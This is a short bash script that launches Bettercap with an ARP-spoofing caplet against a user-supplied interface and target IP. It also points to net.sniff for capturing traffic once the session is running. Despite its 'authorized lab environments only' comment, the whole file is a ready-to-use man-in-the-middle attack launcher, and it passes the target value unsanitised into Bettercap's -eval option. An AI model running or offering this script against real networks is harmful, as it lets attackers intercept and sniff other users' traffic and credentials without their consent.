#!/usr/bin/env bash
# bettercap_arp.sh
# Last Edited by Charles Duoto on November 17, 2026
# Launch Bettercap with the ARP spoof caplet.
# Pure bash wrapper. Authorized lab environments only.
#
# Usage:
#   sudo ./bettercap_arp.sh
#   sudo ./bettercap_arp.sh eth0 192.168.1.10

set -euo pipefail

IFACE="${1:-}"
TARGET="${2:-}"

if [[ -z "$IFACE" ]]; then
    read -rp "Interface [eth0]: " IFACE
    IFACE="${IFACE:-eth0}"
fi

if [[ -z "$TARGET" ]]; then
    read -rp "Target IP: " TARGET
fi

if [[ -z "$TARGET" ]]; then
    echo "[-] Target IP required."
    exit 1
fi

CAPLET="$(dirname "$0")/arp_spoof.cap"
if [[ ! -f "$CAPLET" ]]; then
    echo "[-] Caplet not found: $CAPLET"
    exit 1
fi

echo "[*] Interface : $IFACE"
echo "[*] Target    : $TARGET"
echo "[*] Caplet    : $CAPLET"
echo
echo "[*] Starting Bettercap..."
echo "[*] Inside the session you can still run: net.show, net.sniff, etc."
echo "[*] Type 'exit' or Ctrl+C to stop."
echo

# Pass the target into the caplet via eval
bettercap -iface "$IFACE" -eval "set arp.spoof.targets $TARGET" -caplet "$CAPLET"
